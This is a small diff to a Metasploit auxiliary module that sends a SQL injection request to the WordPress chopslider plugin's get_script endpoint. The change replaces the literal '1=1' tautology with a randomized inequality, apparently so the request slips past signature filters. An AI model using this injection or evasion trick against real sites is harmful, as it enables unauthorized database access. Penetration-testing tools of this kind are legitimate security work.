@@ -71,7 +71,7 @@ class MetasploitModule < Msf::Auxiliary
       payload = Rex::Text.uri_encode(payload)
       res = send_request_raw({
         'method' => 'GET',
-        'uri' => "#{normalize_uri(target_uri.path, 'wp-content', 'plugins', 'chopslider', 'get_script', 'index.php')}?id=#{sliderid}%20OR%201=1%20AND%20#{payload}"
+        'uri' => "#{normalize_uri(target_uri.path, 'wp-content', 'plugins', 'chopslider', 'get_script', 'index.php')}?id=#{sliderid}%20OR%20#{rand(0..10)}<>#{rand(11..1000)}%20AND%20#{payload}"
       })
       fail_with Failure::Unreachable, 'Connection failed' unless res
     end
